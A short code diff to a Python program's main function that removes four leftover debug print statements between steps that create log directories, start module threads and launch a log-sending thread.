@@ -79,15 +79,11 @@ def panic():
 def main():
     try:
         startup_message()
-        print("made it 1")
         create_log_directories()
-        print("made it 2")
         modules = create_modules()
         threads = start_threads(modules)
-        print("made it 3")
         send_logs_thread = threading.Thread(target=send_all_logs, args=(modules,))
         send_logs_thread.start()
-        print("made it 4")
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
